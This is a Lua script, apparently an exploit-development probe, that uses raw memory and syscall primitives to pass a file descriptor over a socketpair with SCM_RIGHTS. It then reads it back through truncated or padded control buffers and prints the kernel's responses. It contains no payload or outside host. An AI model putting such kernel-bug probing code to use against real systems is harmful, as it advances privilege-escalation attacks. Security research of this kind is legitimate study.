
local function tn(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function wd(a, v) memory.write_dword(a, v) end
local function wq(a, v) memory.write_qword(a, v) end
syscall.resolve({ socketpair = 135, sendmsg = 28, recvmsg = 27, close = 6,
                  fcntl = 92, socket = 97 })
local MSG_DONTWAIT = 0x80
local sv = memory.alloc(8)
pcall(function() assert(tn(syscall.socketpair(1, 1, 0, sv)) == 0) end)
local s0, s1 = tn(memory.read_dword(sv)), tn(memory.read_dword(sv + 4))
-- make BOTH sockets nonblocking: fcntl(fd, F_SETFL=4, O_NONBLOCK=4)
pcall(function() syscall.fcntl(s0, 4, 4) end)
pcall(function() syscall.fcntl(s1, 4, 4) end)
local sv2 = memory.alloc(8)
pcall(function() assert(tn(syscall.socketpair(1, 1, 0, sv2)) == 0) end)
local victim = tn(memory.read_dword(sv2))
local iobuf = memory.alloc(64); wd(iobuf, 0x41424344)
local iov = memory.alloc(32); wq(iov, iobuf); wd(iov + 8, 4)
local cmsg = memory.alloc(64)
for off = 0, 31, 4 do wd(cmsg + off, 0) end
wd(cmsg + 0, 20); wd(cmsg + 4, 0xFFFF); wd(cmsg + 8, 1); wd(cmsg + 16, victim)
local msg = memory.alloc(128)
wq(msg + 0x00, 0); wd(msg + 0x08, 0)
wq(msg + 0x10, iov); wd(msg + 0x18, 1)
wd(msg + 0x30, 0)
local function send_rights(on)
    wq(msg + 0x20, on and cmsg or 0)
    wd(msg + 0x28, on and 24 or 0)
    local ok, r = pcall(function() return tn(syscall.sendmsg(s0, msg, 0)) end)
    return ok and r or -1
end
local function do_recv(ctrl)
    local out = {}
    local rbuf = memory.alloc(128); wq(rbuf, 0)
    local riov = memory.alloc(32); wq(riov, rbuf); wd(riov + 8, 64)
    local rcmsg = memory.alloc(128)
    for off = 0, 120, 4 do wd(rcmsg + off, 0xCCCCCCCC) end
    local rmsg = memory.alloc(128)
    wq(rmsg + 0x00, 0); wd(rmsg + 0x08, 0)
    wq(rmsg + 0x10, riov); wd(rmsg + 0x18, 1)
    wq(rmsg + 0x20, rcmsg); wd(rmsg + 0x28, ctrl)
    wd(rmsg + 0x30, 0)
    local ok, r = pcall(function() return tn(syscall.recvmsg(s1, rmsg, MSG_DONTWAIT)) end)
    out[1] = ok and r or "EXC"
    out[2] = tn(memory.read_dword(rmsg + 0x28))
    out[3] = string.format("%x", tn(memory.read_dword(rmsg + 0x30)))
    out[4] = tn(memory.read_dword(rcmsg))
    out[5] = tn(memory.read_dword(rcmsg + 16))
    out[6] = tn(memory.read_dword(rbuf))
    return out
end

print("=== W4: rights + full24 recv + recv2, DONTWAIT ===")
print("send=" .. send_rights(true))
local r1 = do_recv(24)
print("recv1=" .. tostring(r1[1]) .. " ret_ctrl=" .. r1[2] .. " flags=" .. r1[3] ..
      " cmsg0=0x" .. string.format("%x", r1[4]) .. " fd=" .. r1[5])
local r2 = do_recv(64)
print("recv2=" .. tostring(r2[1]) .. " ret_ctrl=" .. r2[2] .. " flags=" .. r2[3] ..
      " data=0x" .. string.format("%x", r2[6]))
print("W_DONE")
